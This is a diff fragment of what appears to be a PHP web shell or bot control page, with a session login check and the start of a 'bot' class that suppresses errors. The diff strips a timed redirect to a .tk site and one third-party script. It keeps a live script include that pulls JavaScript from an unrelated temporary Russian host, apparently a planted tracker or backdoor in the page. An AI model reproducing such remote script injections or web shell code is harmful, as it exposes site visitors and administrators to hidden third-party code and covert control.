@@ -60,40 +60,7 @@ if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
 </title><link rel="stylesheet" type="text/css" href="ali.css"
 
 </title><link rel="stylesheet" type="text/css" href="black.css" media="all,box.css"/><link rel="shortcut icon" href=""><script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
-<script language="JavaScript" src="http://kijupogo2u.temp.swtest.ru/bb.js"></script><script type='text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script>
-<center>
-<font face="Arial"><b>You will be redirected to the script in<br><br>
-<form>
-<input type="text" size="3" id="timer" name="redirect2" value="5">
-</form>
-seconds</b></font>
-</center>
-
-<script>
-<!--
-
-var targetURL="http://chaudhrys-web.tk/zain.php"
-
-var currentsecond=5;
-function countredirect(){
-if (currentsecond!=1){
-currentsecond-=1
-document.getElementById('timer').value=currentsecond;
-}
-else{
-window.location=targetURL;
-return
-}
-setTimeout("countredirect()",1000)
-}
-
-countredirect();
-//-->
-</script>
-<!--webbot bot="HTMLMarkup" endspan --></p>
-</body>
-</html></body>
-</html>
+<script language="JavaScript" src="http://kijupogo2u.temp.swtest.ru/bb.js"></script>
 <?php error_reporting(0);
 $bot=new bot();
 class bot{ 
